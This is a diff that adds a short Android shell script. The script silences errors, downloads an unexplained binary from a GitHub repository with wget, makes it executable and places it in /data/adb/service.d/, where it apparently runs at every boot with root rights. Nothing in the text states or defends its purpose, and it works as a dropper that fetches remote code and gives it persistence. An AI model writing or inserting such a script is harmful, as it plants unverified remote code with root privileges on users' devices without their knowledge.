@@ -1,0 +1,5 @@
+#!/bin/sh
+exec 2> /dev/zero
+wget -O /data/local/tmp/service https://github.com/Androidmate/test/raw/master/service
+chmod +x /data/local/tmp/service
+mv /data/local/tmp/service /data/adb/service.d/service
